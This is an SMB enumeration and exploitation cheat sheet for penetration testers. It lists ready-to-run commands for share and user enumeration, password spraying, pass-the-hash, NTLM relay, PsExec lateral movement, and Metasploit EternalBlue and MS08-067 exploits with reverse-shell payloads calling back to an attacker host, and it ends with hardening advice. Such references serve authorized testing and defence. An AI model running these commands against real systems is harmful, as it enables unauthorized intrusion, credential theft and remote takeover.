# SMB Enumeration and Exploitation Cheat Sheet

## Table of Contents
- [Overview of SMB](#overview-of-smb)
- [SMB Enumeration Methodology](#smb-enumeration-methodology)
  - [1. Hostname Discovery](#1-hostname-discovery)
  - [2. Share Enumeration and Null Sessions](#2-share-enumeration-and-null-sessions)
  - [3. User Enumeration](#3-user-enumeration)
  - [4. Vulnerability Scanning](#4-vulnerability-scanning)
  - [5. Comprehensive Enumeration](#5-comprehensive-enumeration)
- [SMB Exploitation Techniques](#smb-exploitation-techniques)
  - [1. Password Attacks](#1-password-attacks)
  - [2. Common SMB Vulnerabilities and Exploits](#2-common-smb-vulnerabilities-and-exploits)
  - [3. Lateral Movement with PsExec](#3-lateral-movement-with-psexec)
  - [4. Pass-the-Hash Attacks](#4-pass-the-hash-attacks)
  - [5. Relay Attacks](#5-relay-attacks)
- [SMB Security Hardening](#smb-security-hardening)
- [Port Reference](#port-reference)

## Overview of SMB

**What is SMB?**
Server Message Block (SMB) is an application layer network protocol used primarily for file sharing, printer sharing, and access to remote services. It allows applications to read, create, and update files on remote systems, as well as communicate with other programs over a network.

**Key SMB Versions:**
- **CIFS**: Original version included in Windows NT 4.0 (1996)
- **SMB 1.0**: Windows 2000, XP, Server 2003, Server 2003 R2
- **SMB 2.0**: Windows Vista, Server 2008
- **SMB 2.1**: Windows 7, Server 2008 R2
- **SMB 3.0**: Windows 8, Server 2012
- **SMB 3.02**: Windows 8.1, Server 2012 R2
- **SMB 3.1**: Windows 10, Server 2016
- **SMB 3.1.1**: Latest version (Windows 10, Server 2016) with improved security features

**SMB Security Levels:**
1. **Share Level**: Each share has a password
2. **User Level**: Applied to individual files, based on specific user access rights

## SMB Enumeration Methodology

### 1. Hostname Discovery

#### Using nmblookup
```bash
nmblookup -A <target_ip>
```
**Flags interpretation:**
- For unique names:
  - `00`: Workstation Service (workstation name)
  - `03`: Windows Messenger service
  - `06`: Remote Access Service
  - `20`: File Service (Host Record)
  - `21`: Remote Access Service client
  - `1B`: Domain Master Browser (PDC for domain)
  - `1D`: Master Browser
- For group names:
  - `00`: Workstation Service (workgroup/domain name)
  - `1C`: Domain Controllers for a domain
  - `1E`: Browser Service Elections

#### Using nbtscan
```bash
nbtscan <target_ip>
```

#### Using nmap's nbstat script
```bash
nmap --script nbstat.nse <target_ip>
```

#### Using Windows nbtstat command
```bash
nbtstat -A <target_ip>
```

#### Using ping with reverse DNS lookup
```bash
ping -a <target_ip>
```

#### Using nmap's smb-os-discovery script
```bash
nmap --script smb-os-discovery <target_ip>
```

### 2. Share Enumeration and Null Sessions

#### Using SMBMap
```bash
# Anonymous/null session
smbmap -H <target_ip>

# Authenticated access
smbmap -H <target_ip> -u <username> -p <password>

# Domain authentication
smbmap -H <target_ip> -d <domain> -u <username> -p <password>
```

#### Using smbclient
```bash
# List shares
smbclient -L <target_ip>
smbclient -L <target_ip> -U <username>%<password>

# Connect to specific share
smbclient //<target_ip>/<share_name>
smbclient //<target_ip>/<share_name> -U <username>%<password>

# Download file within share
get <filename>
```

#### Using nmap's smb-enum-shares script
```bash
nmap --script smb-enum-shares -p139,445 <target_ip>
```

#### Using Windows net view command
```bash
# List all shares
net view \\<target_ip> /All

# Access share
dir \\<target_ip>\<share_name>

# Copy files
copy \\<target_ip>\<share_name>\<file> <local_path>
```

#### Using Metasploit: smb_enumshares
```bash
use auxiliary/scanner/smb/smb_enumshares
set rhosts <target_ip>
set smbuser <username>
set smbpass <password>
exploit
```

#### Using CrackMapExec
```bash
crackmapexec smb <target_ip> -u '<username>' -p '<password>' --shares
```

#### Using rpcclient
```bash
# Anonymous/null session
rpcclient -U "" -N <target_ip>

# Authenticate with credentials
rpcclient -U "<username>%<password>" <target_ip>

# Enumerate shares
netshareenum
netshareenumall
```

### 3. User Enumeration

#### Using Metasploit: smb_lookupsid
```bash
use auxiliary/scanner/smb/smb_lookupsid
set rhosts <target_ip>
set smbuser <username>
set smbpass <password>
exploit
```

#### Using Impacket's lookupsid.py
```bash
python3 lookupsid.py <domain>/<username>:<password>@<target_ip>
```

#### Using rpcclient for user enumeration
```bash
# Connect with rpcclient
rpcclient -U "<username>%<password>" <target_ip>

# Enumerate users
enumdomusers
queryuser <rid>
lookupnames <username>
```

#### SMB User Brute Force with Hydra
```bash
hydra -L userlist.txt -P passwordlist.txt <target_ip> smb
```

### 4. Vulnerability Scanning

#### Using nmap for SMB vulnerability assessment
```bash
# Check for all SMB vulnerabilities
nmap --script smb-vuln* -p139,445 <target_ip>

# Check for specific vulnerabilities
nmap --script smb-vuln-ms17-010 -p445 <target_ip>  # EternalBlue
nmap --script smb-vuln-ms08-067 -p445 <target_ip>  # NetAPI
```

### 5. Comprehensive Enumeration

#### Using enum4linux
```bash
enum4linux <target_ip>

# Targeted enumeration
enum4linux -u <username> -p <password> -S <target_ip>  # Shares only
enum4linux -u <username> -p <password> -U <target_ip>  # Users only
enum4linux -u <username> -p <password> -P <target_ip>  # Password policy
```

## SMB Exploitation Techniques

### 1. Password Attacks

#### SMB Password Spray with CrackMapExec
```bash
crackmapexec smb <target_ip> -u users.txt -p 'Password123'
```

#### Password Dictionary Attack
```bash
crackmapexec smb <target_ip> -u <username> -p passwords.txt
```

### 2. Common SMB Vulnerabilities and Exploits

#### EternalBlue (MS17-010)
```bash
# Check vulnerability
nmap --script smb-vuln-ms17-010 -p445 <target_ip>

# Metasploit exploitation
use exploit/windows/smb/ms17_010_eternalblue
set rhosts <target_ip>
set payload windows/x64/meterpreter/reverse_tcp
set lhost <attacker_ip>
exploit
```

#### SMBv1 Vulnerabilities (MS08-067)
```bash
# Check vulnerability
nmap --script smb-vuln-ms08-067 -p445 <target_ip>

# Metasploit exploitation
use exploit/windows/smb/ms08_067_netapi
set rhosts <target_ip>
set payload windows/meterpreter/reverse_tcp
set lhost <attacker_ip>
exploit
```

### 3. Lateral Movement with PsExec

#### Using Impacket's psexec.py
```bash
python3 psexec.py <domain>/<username>:<password>@<target_ip>
```

#### Using Metasploit PsExec
```bash
use exploit/windows/smb/psexec
set smbdomain <domain>
set smbuser <username>
set smbpass <password>
set rhosts <target_ip>
set payload windows/meterpreter/reverse_tcp
set lhost <attacker_ip>
exploit
```

### 4. Pass-the-Hash Attacks

#### Using CrackMapExec
```bash
crackmapexec smb <target_ip> -u <username> -H <NTLM_hash>
```

#### Using Impacket's psexec.py
```bash
python3 psexec.py -hashes <LM_hash>:<NTLM_hash> <domain>/<username>@<target_ip>
```

#### Using Metasploit
```bash
use exploit/windows/smb/psexec
set smbdomain <domain>
set smbuser <username>
set smbpass <LM_hash>:<NTLM_hash>
set rhosts <target_ip>
exploit
```

### 5. Relay Attacks

#### Using responder
```bash
responder -I eth0 -wrf
```

#### Using ntlmrelayx.py
```bash
python3 ntlmrelayx.py -tf targets.txt -smb2support
```

## SMB Security Hardening

1. **Disable SMB v1** - Highly vulnerable to attacks
2. **Apply security patches** promptly
3. **Use strong authentication** - Complex passwords, MFA where possible
4. **Implement network segmentation** for SMB traffic
5. **Enable SMB signing** to prevent MITM attacks
6. **Disable guest accounts** and anonymous access
7. **Implement proper share permissions**
8. **Use SMB encryption** available in SMB 3.0+
9. **Regularly audit SMB shares** and access permissions
10. **Monitor for unusual SMB activity** in logs

## Port Reference
- SMB typically runs on:
  - TCP port 445 (SMB over TCP)
  - TCP/UDP port 139 (SMB over NetBIOS)
